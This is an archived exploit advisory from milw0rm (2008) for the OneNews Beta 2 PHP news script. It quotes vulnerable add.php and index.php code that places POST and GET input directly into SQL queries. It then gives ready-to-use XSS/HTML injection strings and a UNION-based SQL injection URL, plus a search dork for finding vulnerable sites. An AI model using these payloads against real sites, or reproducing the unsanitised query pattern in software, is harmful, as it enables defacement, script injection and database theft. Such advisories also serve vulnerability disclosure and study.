<html><head><title>OneNews Beta 2 (XSS/HI/SQL) Multiple Remote Vulnerabilities</title></head><pre>______________________///////////////\\\\\\\\\\\\\\\____________________
}Name   : OneNews Beta 2 Multiple Vulnerabilities                      {
{Author : suN8Hclf[crimsoN_Loyd9], (DaRk-CodeRs Group)                 }
}Source : http://sourceforge.net/project/showfiles.php?group_id=193198 {
{Dork   : Powered by One-News                                          }
}Greetz : all DaRk-CodeRs guys, e.wiZz, str0ke                         {
_________________________________{}*{}__________________________________


==========================
|1. XSS and html injection|
==========================
Conditions: MAGIC_QUOTES=ON/OFF
Vulnerable code(add.php):
--------------------------------------CODE----------------------------------------------
$insert = &quot;INSERT INTO entries (title, content) VALUES ('&quot; . $_POST['title'] . &quot;', '&quot; . $_POST['content'] . &quot;')&quot;;
mysql_query($insert) or die ('I cannot do that because ' . mysql_error());
--------------------------------------CODE----------------------------------------------
Vulnerable code(index.php):
--------------------------------------CODE----------------------------------------------
$insert = &quot;INSERT INTO comments (blogid, author, comment) VALUES ('&quot; . $_POST['itemnum'] . &quot;', '&quot; . $_POST['author'] . &quot;', '&quot; . $_POST['comment'] . &quot;')&quot;;
mysql_query($insert) or die ('I cannot do that because ' . mysql_error());
--------------------------------------CODE----------------------------------------------

NOTE:
To exploit the bug in the add.php code, you have got to be logged in!!!

Exploit:
Put this down into the forms, while adding comments(index.php) or news(add.php):

1. &lt;h1&gt;HACKED&lt;/h1&gt;
2. &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body bgcolor=\&quot;red\&quot;&gt;HACKED&lt;/body&gt;&lt;/html&gt;
3. &lt;script&gt;alert(\'Hacked\');&lt;/script&gt;
4. Use your imagination :)

==========================
|2. SQL Injection        |
==========================
Conditions: MAGIC_QUOTES=OFF
Vulnerable code(index.php):
--------------------------------------CODE----------------------------------------------
$query = &quot;SELECT * FROM entries WHERE id = '&quot; . $_GET['q'] . &quot;' LIMIT 1&quot;;
$result = mysql_query($query);
while($row = mysql_fetch_array($result)){ 
--------------------------------------CODE----------------------------------------------

Exploit:

http://localhost:8080/onenews_beta2/index.php?q=3' and 1=2 union select 1,2,3/*

# milw0rm.com [2008-08-23]</pre></html>